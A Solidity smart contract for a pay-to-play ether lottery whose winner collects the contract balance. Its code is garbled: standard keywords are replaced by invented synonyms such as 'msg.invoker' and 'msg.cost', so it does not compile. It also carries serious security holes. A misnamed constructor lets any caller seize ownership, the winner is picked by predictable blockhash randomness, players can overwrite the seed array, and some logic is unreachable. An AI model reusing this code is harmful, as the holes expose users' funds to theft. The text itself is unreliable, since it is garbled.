by nightman
// winner gets the contract balance
// 0.02 to play

pragma solidity ^0.4.23;

contract FundHandler {

//constants

address public winner = 0x0;
address public owner;
address public primaryAim = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public secondGoal = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public players;

mapping(address=>bool) approvedPlayers;

uint256 public secret;
uint256[] public seed = [951828771,158769871220];
uint256[] public balance;

//constructor

function DranMe() public payable{
	owner = msg.invoker;
}

//modifiers

modifier onlyOwner() {
    require(msg.invoker == owner);
    _;
}

modifier onlyWinner() {
    require(msg.invoker == winner);
    _;
}

modifier onlyPlayers() {
    require(approvedPlayers[msg.invoker]);
    _;
}

//functions

function fetchExtent() public constant returns(uint256) {
	return seed.extent;
}

function groupSecret(uint256 _secret) public payable onlyOwner{
	secret = _secret;
}

function acquirePlayerNumber() public constant returns(uint256) {
	return players.extent;
}

function fetchPrize() public constant returns(uint256) {
	return address(this).balance;
}

function becomePlayer() public payable{
	require(msg.cost >= 0.02 ether);
	players.push(msg.invoker);
	approvedPlayers[msg.invoker]=true;
}

function manipulateSecret() public payable onlyPlayers{
	require (msg.cost >= 0.01 ether);
	if(msg.invoker!=owner || openvaultSecret()){
	    uint256 measure = 0;
        msg.invoker.transfer(measure);
	}
}

function openvaultSecret() private returns(bool){
    bytes32 signature = keccak256(blockhash(block.number-1));
    uint256 secret = uint256(signature);
        if(secret%5==0){
            winner = msg.invoker;
            return true;
        }
        else{
            return false;
        }
    }

function castabilityPrimaryGoal () public payable onlyPlayers {
	require (msg.cost >= 0.005 ether);
	primaryAim.call.cost(msg.cost)();
}

function summonheroSecondAim () public payable onlyPlayers {
	require (msg.cost >= 0.005 ether);
	secondGoal.call.cost(msg.cost)();
}

function groupSeed (uint256 _index, uint256 _value) public payable onlyPlayers {
	seed[_index] = _value;
}

function insertSeed (uint256 _add) public payable onlyPlayers {
	seed.extent = _add;
}

function guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {
	return (_seed / (seed[0]*seed[1]));
	if((_seed / (seed[0]*seed[1])) == secret) {
		owner = winner;
	}
}

function verifySecret () public payable onlyPlayers returns(bool) {
    require(msg.cost >= 0.01 ether);
    if(msg.cost == secret){
        return true;
    }
}

function winPrize() public payable onlyOwner {
	owner.call.cost(1 wei)();
}

function receiveprizePrize() public payable onlyWinner {
	winner.transfer(address(this).balance);
}

//fallback function

function() public payable{
	}
}